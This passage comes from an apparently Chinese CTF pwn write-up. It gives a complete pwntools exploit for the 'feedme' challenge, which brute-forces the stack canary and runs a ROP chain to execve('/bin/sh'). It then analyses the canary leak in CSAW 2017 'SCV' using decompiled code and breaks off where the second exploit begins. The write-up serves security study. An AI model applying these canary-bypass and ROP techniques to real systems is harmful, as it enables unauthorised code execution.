class="string">&quot;Child IO error!&quot;</span>);</span><br><span class="line">      FUN_0804ed20(<span class="number">0xffffffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>((uint *)<span class="string">&quot;Child exit.&quot;</span>);</span><br><span class="line">    param_1 = (<span class="type">int</span> **)FUN_0804fa20((uint *)<span class="number">0x0</span>);</span><br><span class="line">    count = count + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  uVar1 = feedFunction();</span><br><span class="line">  <span class="built_in">printf</span>((uint *)<span class="string">&quot;YUM, got %d bytes!\n&quot;</span>,(<span class="type">char</span>)uVar1);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一句条件判断我们有800次程序崩溃机会，这对于我们爆破4字节canary来说是足够了的（并且gdb查看发现只需要爆破3位，其中最后的\x00是固定的），我需要爆破的次数<code>0xFF*3=765</code>&lt;<code>800</code><br />接下来就直接上exp了,<code>input</code>到栈底的距离0x30(0xffffcf4c-0xffffcf1c)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;feedme&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#ROPgadget</span></span><br><span class="line"><span class="comment">#0x0807be31 : mov dword ptr [eax], edx ; ret</span></span><br><span class="line"><span class="comment">#0x080bb496 : pop eax ; ret</span></span><br><span class="line"><span class="comment">#0x0806f34a : pop edx ; ret</span></span><br><span class="line"><span class="comment">#0x0806f371 : pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="comment">#0x08049761 : int 0x80  syscall()</span></span><br><span class="line"></span><br><span class="line">mov_peax_edx = <span class="number">0x0807be31</span></span><br><span class="line">pop_eax = <span class="number">0x080bb496</span></span><br><span class="line">pop_edx = <span class="number">0x0806f34a</span></span><br><span class="line">pop_ecx_ebx = <span class="number">0x0806f371</span></span><br><span class="line">int_80 = <span class="number">0x08049761</span></span><br><span class="line">bss_rw = <span class="number">0x80ea000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">burpCanary</span>():</span><br><span class="line">    count = <span class="number">1</span>;</span><br><span class="line">    full_canary=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    try_canary=<span class="number">0x0</span></span><br><span class="line">    size=<span class="number">0x22</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Try byte(&quot;</span>+<span class="built_in">str</span>(count)+<span class="string">&quot;):&quot;</span>+<span class="built_in">hex</span>(try_canary))</span><br><span class="line">            p.send(<span class="built_in">chr</span>(size).encode())</span><br><span class="line">            p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+full_canary+try_canary.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">            output = p.recvuntil(<span class="string">b&#x27;exit.&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;YUM&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;==================================Find one byte:&quot;</span>+<span class="built_in">hex</span>(try_canary))</span><br><span class="line">                full_canary+=try_canary.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">                try_canary=<span class="number">0x0</span></span><br><span class="line">                size+=<span class="number">0x1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                try_canary+=<span class="number">1</span></span><br><span class="line">            count+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> full_canary</span><br><span class="line"></span><br><span class="line">canary = burpCanary()</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+canary</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite ret_addr</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wriet string /bin/sh</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(bss_rw)</span><br><span class="line">payload += p32(pop_edx)</span><br><span class="line">payload += p32(<span class="number">0x6e69622f</span>)</span><br><span class="line">payload += p32(mov_peax_edx)</span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(bss_rw+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(pop_edx)</span><br><span class="line">payload += p32(<span class="number">0x68732f</span>)</span><br><span class="line">payload += p32(mov_peax_edx)</span><br><span class="line"></span><br><span class="line"><span class="comment">#syscall</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss_rw)</span><br><span class="line">payload += p32(pop_edx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload size:&quot;</span>+size(payload))</span><br><span class="line">payload_size = size(payload)</span><br><span class="line">payload_size = <span class="built_in">int</span>(payload_size.replace(<span class="string">&quot;B&quot;</span>,<span class="string">&quot;&quot;</span>))</span><br><span class="line">payload_size = payload_size.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.send(payload_size)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最后这里卡了我一个小时，一直排查问题发现ROP chains构造的时候对照表我用的<code>unistd_64.h</code>，可是。。这TMD是32位的啊！</p><blockquote><p>小记：这里顺手写一下之前注意到了但是没有使用的pwntools程式加载方法，原本的<code>p=process('./program')</code>默认使用的动态链接库是系统自带的，但是使用了<code>p=process('./program',env=&#123;'LD_PRELOAD':'./local.so.6'&#125;)</code>就是使用的当前文件夹的动态链接库，这是一个解决环境冲突的比较好的一个方法，例如在高版本的libc测试system函数执行/bin/sh的时候如果不进行堆栈平衡那么程序依旧是会载入payload直接程序崩溃，这个时候载入实验远端动态链接库就可以在本地直接跑通</p></blockquote><h2 id="csaw-2017-quasl-svc"><a class="markdownIt-Anchor" href="#csaw-2017-quasl-svc"></a> Csaw 2017 Quasl SVC</h2><p>程序下载<a href="/cyber/pwn/scv2017">scv2017</a>,先看看程序的一些基本信息</p><p>程式保护和文件信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">scv: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8585d22b995d2e1ab76bd520f7826370df71e0b6, stripped</span><br></pre></td></tr></table></figure><p>程序运行[菜单]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-------------------------</span><br><span class="line">[*]SCV GOOD TO GO,SIR....</span><br><span class="line">-------------------------</span><br><span class="line">1.FEED SCV....</span><br><span class="line">2.REVIEW THE FOOD....</span><br><span class="line">3.MINE MINERALS....</span><br><span class="line">-------------------------</span><br></pre></td></tr></table></figure><p>没看反编译这里测试我发现菜单输入字母会触发无限打印菜单，先输入1然后输入一大堆无效数据也是会触发无限打印菜单，这里的<code>2</code>、<code>3</code>的作用都不太大，2是重新打印出我们输入的内容，3是直接退出程式，所以这里的主攻位置应该是一栏目<br />Ghidra反编译</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  basic_ostream *<span class="keyword">this</span>;</span><br><span class="line">  <span class="type">ssize_t</span> read_num;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> choice;</span><br><span class="line">  <span class="type">int</span> quit_flag;</span><br><span class="line">  undefined4 local_bc;</span><br><span class="line">  <span class="type">char</span> input [<span class="number">168</span>];</span><br><span class="line">  <span class="type">long</span> canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  choice = <span class="number">0</span>;</span><br><span class="line">  quit_flag = <span class="number">1</span>;</span><br><span class="line">  local_bc = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (quit_flag != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">    std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">              ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">               std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;[*]SCV GOOD TO GO,SIR....&quot;</span>);</span><br><span class="line">    std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">              ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">               std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">    std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">              ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">               std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;1.FEED SCV....&quot;</span>);</span><br><span class="line">    std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">              ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">               std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;2.REVIEW THE FOOD....&quot;</span>);</span><br><span class="line">    std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">              ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">               std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;3.MINE MINERALS....&quot;</span>);</span><br><span class="line">    std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">              ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">               std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">    std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">              ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">               std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;&gt;&gt;&quot;</span>);</span><br><span class="line">    std::basic_istream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&gt;&gt;</span><br><span class="line">              ((basic_istream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)std::cin,&amp;choice);</span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;[*]REVIEW THE FOOD...........&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;[*]PLEASE TREAT HIM WELL.....&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="built_in">puts</span>(input);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>) &#123;</span><br><span class="line">      quit_flag = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;[*]BYE ~ TIME TO MINE MIENRALS...&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;[*]SCV IS ALWAYS HUNGRY.....&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;[*]GIVE HIM SOME FOOD.......&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;&gt;&gt;&quot;</span>);</span><br><span class="line">      read_num = <span class="built_in">read</span>(<span class="number">0</span>,input,<span class="number">0xf8</span>);</span><br><span class="line">      local_bc = (undefined4)read_num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">this</span> = std::<span class="keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="string">&quot;[*]DO NOT HURT MY SCV....&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt; *)<span class="keyword">this</span>,</span><br><span class="line">                 std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (canary == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看完反编译后目前程序结构就比较清晰了，是一个canary+栈溢出，input的空间是<code>0xa8</code>,read函数可以覆盖的最大字节数是<code>0xf8</code>，由于程序是<code>x86_64</code>架构，所以canary的随机值是8位。这个时候<code>choice=2</code>的作用就体现出来了，因为条件语句块里面有puts(input)的关键语句，<code>puts</code>的作用是会输出所给指针所有内容直到到达空白字节，Canary的最低字节就是空字节；这下可以有个思路了，第一次我们不溢出，利用puts函数特性发送<code>0xa9</code>的垃圾数据，多出来的一位用于填充canary空字节，得到canary后再次执行溢出</p><p>这里比较简单，不过也是学习了一点新的流程处理方式</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 